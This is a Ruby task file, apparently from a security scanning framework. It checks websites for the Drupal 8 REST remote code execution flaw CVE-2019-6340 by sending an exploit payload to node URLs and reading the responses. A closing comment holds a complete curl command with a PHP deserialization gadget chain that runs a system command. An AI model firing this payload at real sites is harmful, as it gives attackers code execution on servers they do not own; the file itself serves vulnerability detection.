module Intrigue
module Task
class Drupal8RestRce < BaseTask

  def self.metadata
    {
      :name => "vuln/drupal_8_rest_rce",
      :pretty_name => "Vulnerability Check - Drupal 8 REST RCE",
      :identifiers => [
        { "cve" =>  "CVE-2019-6340" },
        { "vendor" => "SA-CORE-2019-003"}
      ],
      :authors => ["jcran"],
      :description => "A site is only affected by this if one of the following conditions is met: (1) The site has the Drupal 8 core RESTful Web Services (rest) module enabled and allows GET, PATCH or POST requests, or (2) the site has another web services module enabled, like JSON:API in Drupal 8, or Services or RESTful Web Services in Drupal 7.",
      :references => [
       "https://www.ambionics.io/blog/drupal8-rce"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [ {"type" => "Uri", "details" => {"name" => "https://intrigue.io"}} ],
      :allowed_options => [  ],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    uri = _get_entity_name

    # check first 100 nodes
    unknown_node_count = 0
    (1..99).each do |node_id|
      payload_file = "#{$intrigue_basedir}/data/vulns/drupal_8_rest_rce.json"
      payload = File.open(payload_file).read.gsub("[URL_HERE]",uri)

      vuln_uri = "#{uri}/node/#{node_id}?_format=hal_json"
      result = http_request(:get, vuln_uri, nil, {"Content-Type" => "application/hal+json"},payload)

      if result.body =~ /last_comment_timestamp/
        _log_good "VULNERABLE at #{vuln_uri}"

        vulns = _get_entity_detail("vulns") || {}
        vulns["CVE-2019-6340"] = {"vulnerable" => true}
        _set_entity_detail("vulns",vulns)

        return
      end

      if result.body =~ /parameter was not converted for the path/
        _log_error "Unknown node: #{node_id}"
        unknown_node_count += 1
      end

      if result.body =~ /Redirecting/
        _log "Probably not vuln"
      end

      if result.body =~ /Please try again later/
        _log "Not a vuln configuration?"
      end

      return nil if unknown_node_count > 10
    end

  end

end
end
end


=begin
curl --insecure -H "Content-Type: application/hal+json" -X GET http://localhost:8080/node/1/?_format=hal_json --data '{ "link": [ { "value": "link", "options":"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}" } ], "_links": { "type": { "href": "http://localhost:8080/rest/type/shortcut/default" } } }' -v
=end